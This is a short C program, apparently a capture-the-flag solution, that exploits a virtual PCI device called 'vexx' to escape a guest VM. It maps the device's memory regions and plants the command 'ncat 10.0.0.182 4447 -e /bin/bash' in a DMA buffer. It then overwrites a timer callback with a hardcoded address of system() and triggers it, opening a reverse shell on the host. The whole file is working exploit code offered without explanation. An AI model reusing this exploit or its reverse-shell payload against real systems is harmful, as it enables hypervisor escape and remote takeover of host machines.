#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>


#define OFF_PORT 0x240
#define MOD_PORT 0x230

int main(int argc, char *argv[]) {
    //Adjust permissions on ports 0x240 and 0x230
    if(ioperm(OFF_PORT, 3, 1)) {
        exit(1);
    }
    if(ioperm(MOD_PORT, 3, 1)) {
        exit(2);
    }
    
    //set offset to 0xFF
    outb(0xFF, OFF_PORT);
    
    //set memorymode to 0x1
    outb(0x1, MOD_PORT);

    //open resource file associated with vexx_cmb MMIO region
    int cfd = open(argv[1], O_RDWR|O_SYNC);
    if(cfd < 0) {
        exit(3);
    }
    
    //open resource file associated with vexx_mmio MMIO region
    int mfd = open(argv[2], O_RDWR|O_SYNC);
    if(mfd < 0) {
        exit(4);
    }

    //create vexx_cmb mapping
    void *cmb = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_SHARED, cfd, 0);
    if(cmb == MAP_FAILED) {
        exit(4);
    }

    //create vexx_mmio mapping
    void *mmio = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mfd, 0);
    if(mmio == MAP_FAILED) {
        exit(5);
    }
    
    //copy argument string to dma_buf buffer
    strcpy((cmb+0x59), "ncat 10.0.0.182 4447 -e /bin/bash");

    //trigger vexx_cmb_write to overwrite cb field w/ address of system()
    *(u_int64_t *)(cmb + atoi(argv[3])) = 0x7ffff79dd290;
    
    //trigger vexx_cmb_write to overwrite opaque field w. pointer to dma_buf
    *(u_int64_t *)(cmb + atoi(argv[4])) = 0x55555739b678;
    
    //trigger vexx_mmio_write to call timer_mod
    *(u_int64_t *)(mmio + atoi(argv[5])) = 0x1;
    
    exit(0);
}
